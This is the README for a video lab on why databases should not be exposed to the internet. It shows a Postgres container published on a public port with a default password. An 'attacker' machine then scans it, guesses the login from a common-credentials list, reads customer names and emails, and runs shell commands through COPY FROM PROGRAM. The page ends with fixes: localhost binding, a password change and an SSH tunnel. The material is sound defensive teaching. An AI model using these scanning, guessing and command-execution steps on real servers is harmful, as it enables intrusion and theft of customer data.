# Never Expose a Database to the Internet

Video: https://youtu.be/kQqpF_fvTKE  
Written version: https://cloudexplainers.com/never-expose-a-database-to-the-internet/

Everything below ran for real in the video. Run it in a throwaway machine or container, never on a computer you care about.

## Lab files

The machine the video used, as files you can build it from:

- [`lab/common-db-logins.txt`](lab/common-db-logins.txt)
- [`lab/guess.sh`](lab/guess.sh)

## Commands, in the order the video runs them

### What exposed means

```sh
# ana@shop:~$
sudo ufw status verbose
docker run -d --name shop-db -e POSTGRES_PASSWORD=postgres -p 5432:5432 -v shop-data:/var/lib/postgresql postgres:18
docker ps --format 'table {{.Names}}\t{{.Ports}}'
```

### A stranger gets in

```sh
# stranger@stranger:~$
nmap -Pn -p 22,3306,5432,6379,27017 shop | grep -E 'report|/tcp'
cat common-db-logins.txt
guess shop common-db-logins.txt
export PGHOST=shop PGUSER=postgres PGPASSWORD=postgres
psql -Atc 'select datname from pg_database'
psql -d shop -c 'select count(*) from customers'
psql -d shop -c 'select name, email from customers limit 3'
psql -Atc "create temp table o (t text); copy o from program 'id'; select * from o"
# ana@shop:~$
docker logs shop-db 2>&1 | grep -o 'FATAL.*'
```

### Why the firewall missed it

```sh
# ana@shop:~$
sudo iptables -t nat -S DOCKER | grep 5432
```

### Listen on this machine only

```sh
# ana@shop:~$
docker rm -f shop-db
docker run -d --name shop-db -e POSTGRES_PASSWORD=postgres -p 127.0.0.1:5432:5432 -v shop-data:/var/lib/postgresql postgres:18
docker ps --format 'table {{.Names}}\t{{.Ports}}'
docker exec -it shop-db psql -U postgres -c '\password postgres'
# stranger@stranger:~$
nmap -Pn -p 22,3306,5432,6379,27017 shop | grep -E 'report|/tcp'
guess shop common-db-logins.txt
# ana@shop:~$
psql -h 127.0.0.1 -U postgres -d shop -c 'select count(*) from customers'
```

### Ana's own way in

```sh
# ana@laptop:~$
ssh -f -N -L 5432:localhost:5432 shop
psql -h localhost -U postgres -d shop -c 'select count(*) from customers'
```

---
From [Cloud Explainers](https://www.youtube.com/@cloudexplainers). Lab files are MIT licensed (see the repository's LICENSE).
